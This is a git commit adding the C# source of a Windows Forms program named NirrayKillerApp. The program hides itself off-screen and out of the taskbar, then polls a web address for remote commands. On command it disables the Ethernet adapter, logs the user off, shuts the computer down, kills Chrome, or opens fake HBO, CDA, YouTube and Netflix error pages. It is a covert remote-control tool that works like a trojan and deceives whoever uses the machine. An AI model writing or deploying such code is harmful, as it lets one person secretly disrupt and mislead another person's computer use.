33a92eb8570b97822033c10fc101d3b6fe452109
Michał Lipa <lukaszlipa7@gmail.com>
2020-08-10 20:17:17 +0200

    Add project files.

---
+++ NirrayKillerApp/Form1.Designer.cs
@@ -0,0 +1,141 @@
+﻿namespace NirrayKillerApp
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Wymagana zmienna projektanta.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Wyczyść wszystkie używane zasoby.
+        /// </summary>
+        /// <param name="disposing">prawda, jeżeli zarządzane zasoby powinny zostać zlikwidowane; Fałsz w przeciwnym wypadku.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Kod generowany przez Projektanta formularzy systemu Windows
+
+        /// <summary>
+        /// Metoda wymagana do obsługi projektanta — nie należy modyfikować
+        /// jej zawartości w edytorze kodu.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.Licznik_SprawdzanieStrony = new System.Windows.Forms.Timer(this.components);
+            this.UruchomInternetPonownie = new System.Windows.Forms.Timer(this.components);
+            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
+            this.cmd_line = new System.Windows.Forms.TextBox();
+            this.Webbo = new System.Windows.Forms.WebBrowser();
+            this.HBO_FORCE_ERROR = new System.Windows.Forms.Timer(this.components);
+            this.CDA_FORCE_ERROR = new System.Windows.Forms.Timer(this.components);
+            this.YOUTUBE_FORCE_ERROR = new System.Windows.Forms.Timer(this.components);
+            this.ConstContainer = new System.Windows.Forms.TextBox();
+            this.NETFLIX_FORCE_ERROR = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+            // 
+            // Licznik_SprawdzanieStrony
+            // 
+            this.Licznik_SprawdzanieStrony.Enabled = true;
+            this.Licznik_SprawdzanieStrony.Interval = 5000;
+            this.Licznik_SprawdzanieStrony.Tick += new System.EventHandler(this.Licznik_SprawdzanieStrony_Tick);
+            // 
+            // UruchomInternetPonownie
+            // 
+            this.UruchomInternetPonownie.Tick += new System.EventHandler(this.UruchomInternetPonownie_Tick);
+            // 
+            // richTextBox1
+            // 
+            this.richTextBox1.Location = new System.Drawing.Point(12, 32);
+            this.richTextBox1.Name = "richTextBox1";
+            this.richTextBox1.ReadOnly = true;
+            this.richTextBox1.Size = new System.Drawing.Size(100, 95);
+            this.richTextBox1.TabIndex = 0;
+            this.richTextBox1.Text = "";
+            // 
+            // cmd_line
+            // 
+            this.cmd_line.Location = new System.Drawing.Point(12, 133);
+            this.cmd_line.Name = "cmd_line";
+            this.cmd_line.ReadOnly = true;
+            this.cmd_line.Size = new System.Drawing.Size(100, 20);
+            this.cmd_line.TabIndex = 1;
+            // 
+            // Webbo
+            // 
+            this.Webbo.Location = new System.Drawing.Point(12, 159);
+            this.Webbo.MinimumSize = new System.Drawing.Size(20, 20);
+            this.Webbo.Name = "Webbo";
+            this.Webbo.Size = new System.Drawing.Size(74, 41);
+            this.Webbo.TabIndex = 2;
+            this.Webbo.Url = new System.Uri("http://nirray.bplaced.net/Download/egg/refresh.php", System.UriKind.Absolute);
+            // 
+            // HBO_FORCE_ERROR
+            // 
+            this.HBO_FORCE_ERROR.Interval = 2000;
+            this.HBO_FORCE_ERROR.Tick += new System.EventHandler(this.HBO_FORCE_ERROR_Tick);
+            // 
+            // CDA_FORCE_ERROR
+            // 
+            this.CDA_FORCE_ERROR.Interval = 2000;
+            this.CDA_FORCE_ERROR.Tick += new System.EventHandler(this.CDA_FORCE_ERROR_Tick);
+            // 
+            // YOUTUBE_FORCE_ERROR
+            // 
+            this.YOUTUBE_FORCE_ERROR.Interval = 2000;
+            this.YOUTUBE_FORCE_ERROR.Tick += new System.EventHandler(this.YOUTUBE_FORCE_ERROR_Tick);
+            // 
+            // ConstContainer
+            // 
+            this.ConstContainer.Location = new System.Drawing.Point(12, 218);
+            this.ConstContainer.Name = "ConstContainer";
+            this.ConstContainer.ReadOnly = true;
+            this.ConstContainer.Size = new System.Drawing.Size(100, 20);
+            this.ConstContainer.TabIndex = 3;
+            // 
+            // NETFLIX_FORCE_ERROR
+            // 
+            this.NETFLIX_FORCE_ERROR.Interval = 2000;
+            this.NETFLIX_FORCE_ERROR.Tick += new System.EventHandler(this.NETFLIX_FORCE_ERROR_Tick);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(181, 251);
+            this.Controls.Add(this.ConstContainer);
+            this.Controls.Add(this.Webbo);
+            this.Controls.Add(this.cmd_line);
+            this.Controls.Add(this.richTextBox1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Location = new System.Drawing.Point(9999, 0);
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.Manual;
+            this.Load += new System.EventHandler(this.PierwszeUruchomienie);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        public System.Windows.Forms.Timer Licznik_SprawdzanieStrony;
+        public System.Windows.Forms.Timer UruchomInternetPonownie;
+        private System.Windows.Forms.RichTextBox richTextBox1;
+        private System.Windows.Forms.TextBox cmd_line;
+        private System.Windows.Forms.WebBrowser Webbo;
+        private System.Windows.Forms.Timer HBO_FORCE_ERROR;
+        private System.Windows.Forms.Timer CDA_FORCE_ERROR;
+        private System.Windows.Forms.Timer YOUTUBE_FORCE_ERROR;
+        private System.Windows.Forms.TextBox ConstContainer;
+        private System.Windows.Forms.Timer NETFLIX_FORCE_ERROR;
+    }
+}
+
---
+++ NirrayKillerApp/Form1.cs
@@ -0,0 +1,325 @@
+﻿using System;
+using System.Data;
+using System.IO;
+using System.Linq;
+using System.Windows.Forms;
+
+namespace NirrayKillerApp
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void PierwszeUruchomienie(object sender, EventArgs e)
+        {
+            this.Visible = false;
+            this.ShowInTaskbar = false;
+            if (ConstContainer.Text == "")
+            {
+                System.Diagnostics.Process process = new System.Diagnostics.Process();
+                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                startInfo.FileName = "cmd.exe";
+                startInfo.Arguments = "/C netsh interface set interface Ethernet admin=enable";
+                process.StartInfo = startInfo;
+                process.Start();
+                process.Close();
+                ConstContainer.Text = "Enabled";
+            }
+            
+            //this.StartPosition = FormStartPosition.CenterScreen;
+            //this.Licznik_SprawdzanieStrony.Start();
+        }
+
+        private void Licznik_SprawdzanieStrony_Tick(object sender, EventArgs e)
+        {
+
+            if (cmd_line.Text == "DISABLED")
+            {
+                // do not check for new command, wait for ethernet reload
+            }
+            else
+            {
+                try
+                {
+                    System.Net.WebClient wc = new System.Net.WebClient();
+                    byte[] raw = wc.DownloadData("");
+
+                    string webData = System.Text.Encoding.UTF8.GetString(raw);
+                    if (webData != " ")
+                    {
+                        richTextBox1.AppendText("dostępna jest nowa komenda");
+                        richTextBox1.AppendText("\n");
+                        richTextBox1.AppendText(webData);
+                        richTextBox1.AppendText("\n");
+                        if (webData.Contains("turnoffnet30"))
+                        {
+                            UruchomKomendeZListy(1);
+                        }
+                        if (webData.Contains("turnoffnet60"))
+                        {
+                            UruchomKomendeZListy(2);
+                        }
+                        if (webData.Contains("turnoffnetlogout"))
+                        {
+                            UruchomKomendeZListy(3);
+                        }
+                        if (webData.Contains("justlogout"))
+                        {
+                            UruchomKomendeZListy(4);
+                        }
+                        if (webData.Contains("killgooglechrome"))
+                        {
+                            UruchomKomendeZListy(5);
+                        }
+                        if (webData.Contains("turnoffpc"))
+                        {
+                            UruchomKomendeZListy(6);
+                        }
+                        if (webData.Contains("killhbogo"))
+                        {
+                            UruchomKomendeZListy(7);
+                        }
+                        if (webData.Contains("killcdapremium"))
+                        {
+                            UruchomKomendeZListy(8);
+                        }
+                        if (webData.Contains("killyoutube"))
+                        {
+                            UruchomKomendeZListy(9);
+                        }
+                        if (webData.Contains("killnetflix"))
+                        {
+                            UruchomKomendeZListy(10);
+                        }
+                    }
+                    else
+                    {
+                        // only debug
+                        richTextBox1.AppendText("\n");
+                        richTextBox1.AppendText("brak nowej komendy");
+                        richTextBox1.AppendText("\n");
+                    }
+                }
+                catch (System.Net.WebException)
+                {
+                    // nothing
+                }
+            }
+        }
+
+        public void UruchomKomendeZListy(int rodzaj)
+        {
+            if (rodzaj == 1)
+            {
+                Webbo.Refresh();
+                System.Diagnostics.Process process = new System.Diagnostics.Process();
+                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                startInfo.FileName = "cmd.exe";
+                startInfo.Arguments = "/C netsh interface set interface Ethernet admin=disable";
+                process.StartInfo = startInfo;
+                process.Start();
+                process.Close();
+                cmd_line.Text = "DISABLED";
+                UruchomInternetPonownie.Interval = 30000;
+                UruchomInternetPonownie.Enabled = true;
+                UruchomInternetPonownie.Start();
+            }
+            if (rodzaj == 2)
+            {
+                Webbo.Refresh();
+                System.Diagnostics.Process process = new System.Diagnostics.Process();
+                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                startInfo.FileName = "cmd.exe";
+                startInfo.Arguments = "/C netsh interface set interface Ethernet admin=disable";
+                process.StartInfo = startInfo;
+                process.Start();
+                process.Close();
+                cmd_line.Text = "DISABLED";
+                UruchomInternetPonownie.Interval = 60000;
+                UruchomInternetPonownie.Enabled = true;
+                UruchomInternetPonownie.Start();
+            }
+            if (rodzaj == 3)
+            {
+                Webbo.Refresh();
+                System.Diagnostics.Process process = new System.Diagnostics.Process();
+                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                startInfo.FileName = "cmd.exe";
+                startInfo.Arguments = "/C netsh interface set interface Ethernet admin=disable";
+                process.StartInfo = startInfo;
+                process.Start();
+                process.Close();
+                cmd_line.Text = "DISABLED";
+                UruchomInternetPonownie.Interval = 990000;
+                UruchomInternetPonownie.Enabled = false;
+                UruchomInternetPonownie.Stop();
+            }
+            if (rodzaj == 4)
+            {
+                Webbo.Refresh();
+                System.Diagnostics.Process process = new System.Diagnostics.Process();
+                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                startInfo.FileName = "cmd.exe";
+                startInfo.Arguments = "/C shutdown -L";
+                process.StartInfo = startInfo;
+                process.Start();
+                process.Close();
+            }
+            if (rodzaj == 5)
+            {
+                Webbo.Refresh();
+                Kill_chrome();
+            }
+            if (rodzaj == 6)
+            {
+                Webbo.Refresh();
+                System.Diagnostics.Process process = new System.Diagnostics.Process();
+                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                startInfo.FileName = "cmd.exe";
+                startInfo.Arguments = "/C shutdown -s -t 00";
+                process.StartInfo = startInfo;
+                process.Start();
+                process.Close();
+            }
+            if (rodzaj == 7)
+            {
+                Webbo.Refresh();
+                Kill_chrome();
+                ShowHBO_error();
+            }
+            if (rodzaj == 8)
+            {
+                Webbo.Refresh();
+                Kill_chrome();
+                ShowCDA_error();
+            }
+            if (rodzaj == 9)
+            {
+                Webbo.Refresh();
+                Kill_chrome();
+                ShowYouTube_error();
+            }
+            if (rodzaj == 10)
+            {
+                Webbo.Refresh();
+                Kill_chrome();
+                ShowNetflix_error();
+            }
+        }
+        public void ShowHBO_error()
+        {
+            HBO_FORCE_ERROR.Enabled = true;
+            HBO_FORCE_ERROR.Start();
+        }
+        public void ShowCDA_error()
+        {
+            CDA_FORCE_ERROR.Enabled = true;
+            CDA_FORCE_ERROR.Start();
+        }
+        public void ShowYouTube_error()
+        {
+            YOUTUBE_FORCE_ERROR.Enabled = true;
+            YOUTUBE_FORCE_ERROR.Start();
+        }
+        public void ShowNetflix_error()
+        {
+            NETFLIX_FORCE_ERROR.Enabled = true;
+            NETFLIX_FORCE_ERROR.Start();
+        }
+        public void Kill_chrome()
+        {
+            System.Diagnostics.Process.GetProcesses()
+                         .Where(x => x.ProcessName.ToLower()
+                                      .StartsWith("chrome"))
+                         .ToList()
+                         .ForEach(x => x.Kill());
+        }
+
+        private void UruchomInternetPonownie_Tick(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            startInfo.Arguments = "/C netsh interface set interface Ethernet admin=enable";
+            process.StartInfo = startInfo;
+            process.Start();
+            process.Close();
+            cmd_line.Text = "ENABLED";
+            UruchomInternetPonownie.Enabled = false;
+            UruchomInternetPonownie.Stop();
+        }
+
+        private void HBO_FORCE_ERROR_Tick(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            string path = Path.GetDirectoryName(Application.ExecutablePath);
+            string command = "/C start chrome " + path + "/hbogo/hbo_error.html";
+            startInfo.Arguments = command;
+            process.StartInfo = startInfo;
+            process.Start();
+            process.Close();
+            HBO_FORCE_ERROR.Enabled = false;
+            HBO_FORCE_ERROR.Stop();
+        }
+
+        private void CDA_FORCE_ERROR_Tick(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            string path = Path.GetDirectoryName(Application.ExecutablePath);
+            string command = "/C start chrome " + path + "/cdapremium/error.html";
+            startInfo.Arguments = command;
+            process.StartInfo = startInfo;
+            process.Start();
+            process.Close();
+            CDA_FORCE_ERROR.Enabled = false;
+            CDA_FORCE_ERROR.Stop();
+        }
+
+        private void YOUTUBE_FORCE_ERROR_Tick(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            string command = "/C start chrome https://www.youtube.com/error?src=404";
+            startInfo.Arguments = command;
+            process.StartInfo = startInfo;
+            process.Start();
+            process.Close();
+            YOUTUBE_FORCE_ERROR.Enabled = false;
+            YOUTUBE_FORCE_ERROR.Stop();
+        }
+
+        private void NETFLIX_FORCE_ERROR_Tick(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            string path = Path.GetDirectoryName(Application.ExecutablePath);
+            string command = "/C start chrome " + path + "/netflix/help.netflix.com/pl/is-netflix-down.html";
+            startInfo.Arguments = command;
+            process.StartInfo = startInfo;
+            process.Start();
+            process.Close();
+            NETFLIX_FORCE_ERROR.Enabled = false;
+            NETFLIX_FORCE_ERROR.Stop();
+        }
+    }
+}
